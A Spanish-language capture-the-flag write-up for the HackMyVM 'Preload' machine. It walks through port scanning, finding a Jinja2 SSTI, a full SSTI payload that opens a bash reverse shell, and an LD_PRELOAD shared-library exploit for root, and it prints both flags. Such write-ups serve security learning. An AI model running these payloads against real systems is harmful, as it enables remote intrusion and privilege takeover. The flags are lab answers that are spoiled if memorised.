---
icon: flag
---

# Preload HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 03:16 EDT
Nmap scan report for 192.168.5.27
Host is up (0.00072s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 4f:4c:82:94:2b:99:f8:ea:67:ff:67:3c:06:8a:71:b5 (RSA)
|   256 c4:2c:9b:c8:12:93:2f:8a:f1:57:1c:f6:ab:88:b9:61 (ECDSA)
|_  256 10:18:7b:11:c4:c3:d4:1a:54:cc:18:68:14:bb:2e:a7 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0
5000/tcp  open  landesk-rc LANDesk remote management
50000/tcp open  tcpwrapped
|_drda-info: ERROR
MAC Address: 08:00:27:BC:B0:24 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
```

Veremos que tenemos un puerto `80`, un puerto `5000` y un puerto `50000` vamos a ver que contiene cada uno de ellos, si entramos al puerto `80` veremos que una pagina web por defecto de `nginx` por lo que no veremos nada interesante pero si entramos en el puerto `5000` que tiene toda la pinta de que es un servidor de `python3` que soporta una pagina web veremos que tarda mucho en cargar y no llega a cargar del todo, pero si nos vamos al ultimo puerto `50000` rechaza la conexion o directamente no se puede acceder desde dicha peticion por `GET` por lo que vamos a ver que sucede en todo esto a nivel interno y a ver que encontramos.

Vamos a realizar un poco de `fuzzing` a ver si vemos algo interesante.

## SSTI

Despues de un rato vemos que por `GET` no responde el puerto `50000` pero si empezamos con `curls` de esta forma veremos esto:

```shell
curl -i -X POST http://<IP>:50000/ -d "test=1"
```

Info:

```
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: text/html; charset=utf-8
Allow: HEAD, OPTIONS, GET
Content-Length: 178
Server: Werkzeug/2.0.2 Python/3.9.2
Date: Fri, 23 May 2025 07:26:44 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

Nos da un `405` pero nos ha respondido por lo menos y aqui ya estamos viendo informacion valiosa de que realmente si se esta utilizando un servidor `python3` con la tecnologia de `Werkzeug/2.0.2` y tiene toda la pinsta de que se puede estar utilizando `Jinja2` por detras que esto puede ser una vulnerabilidad hacia un `SSTI`, vamos a probar una cosa.

```shell
# CODIFICADO EN URL

curl -i "http://<IP>:50000/?q=%7B%7Bconfig%7D%7D"

# FORMA DECODIFICADA

# curl -i "http://<IP>:50000/?q={{config}}"
```

Info:

```
HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/2.0.2 Python/3.9.2
Date: Fri, 23 May 2025 07:29:04 GMT

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Vemos que efectivamente esta intentando manejar esta informacion pero peta el sevidor con un `500` por lo que vamos bien, vamos a realizar `fuzzing` para ver que parametro es el que puede ejecutar esto mismo.

### FFUF

```shell
ffuf -ic -c -w <WORDLIST> -u 'http://<IP>:50000/?FUZZ=%7B%7B7*7%7D%7D' -fs 290
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.5.27:50000/?FUZZ=%7B%7B7*7%7D%7D
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 290
________________________________________________

cmd                     [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 373ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que ha funcionado con el parametro `cmd` por lo que vamos a comprobarlo con un `curl`.

```shell
curl -i 'http://<IP>:50000/?cmd=%7B%7B7*7%7D%7D' # {{7*7}}
```

Info:

```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 2
Server: Werkzeug/2.0.2 Python/3.9.2
Date: Fri, 23 May 2025 08:00:28 GMT

49
```

Vemos que efectivamente te lo esta multiplicando, por lo que vamos a realizar una `reverse shell` de estar forma:

```shell
curl -i 'http://<IP>:50000/?cmd=%7B%7B%20self._TemplateReference__context.joiner.__init__.__globals__.os.popen%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<IP>/<PORT>%200%3E%261%22%27%29.read%28%29%20%7D%7D' # {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
```

Ahora si nos ponemos a la escucha antes de enviar el `payload`.

```shell
nc -lvnp <PORT>
```

Si enviamos ese `curl` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.27] 36888
bash: cannot set terminal process group (294): Inappropriate ioctl for device
bash: no job control in this shell
paul@preload:/$ whoami
whoami
paul
```

Veremos que ha funcionado por lo que sanitizaremos la `shell`.

### Sanitizacion de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Vamos a leer la `flag` del usuario.

> us3r.txt

```
52f83ff6877e42f613bcd2444c22528c
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for paul on preload:
    env_reset, mail_badpass, env_keep+=LD_PRELOAD, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on preload:
    (root) NOPASSWD: /usr/bin/cat, /usr/bin/cut, /usr/bin/grep, /usr/bin/tail, /usr/bin/head, /usr/bin/ss
```

Vemos que podemos ejecutar varios binarios como el usuario `root`, pero el que mas nos llama la atencion es el `ss` vamos a realizar lo siguiente:

```shell
cd /tmp
```

> exploit.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(void) {
    setuid(0);
    setgid(0);
    // Ejecuta una shell interactiva
    system("/bin/bash");
}
```

Ahora vamos a compilarlo:

```shell
gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
```

Establecemos permisos de ejecuccion.

```shell
chmod +x exploit.so
```

Ahora vamos a ejecutarlo de la siguiente forma para que funcione.

```shell
sudo LD_PRELOAD=/tmp/exploit.so ss
exit # Para salir del bucle fork
```

Info:

```
root@preload:/tmp# whoami
root
```

### Explicación del exploit `LD_PRELOAD` con `exploit.so`

#### **¿Qué es LD\_PRELOAD?**

`LD_PRELOAD` es una variable de entorno en Linux que le dice al cargador dinámico (loader) que **antes de cargar cualquier otra librería compartida, cargue la librería que tú especifiques**.

* Esto permite **sobrescribir funciones o inyectar código** en cualquier programa que uses.
* El programa no sabe que le están inyectando código adicional.
* Muy útil para inyectar código malicioso o parches sin recompilar.

#### **Por qué ejecutar con `sudo LD_PRELOAD=/tmp/exploit.so ss`**

* Ejecutas `ss` con `sudo`, así `ss` tiene permisos root.
* `LD_PRELOAD` fuerza a `ss` a cargar la librería `exploit.so` antes que cualquier otra cosa.
* En ese momento, la función `init()` se ejecuta con privilegios root.
* La función ejecuta la shell root.

Con esto veremos que ya seremos `root` por lo que leeremos la `flag` de `root`.

> 20o7.txt

```
09f7e02f1290be211da707a266f153b3
```
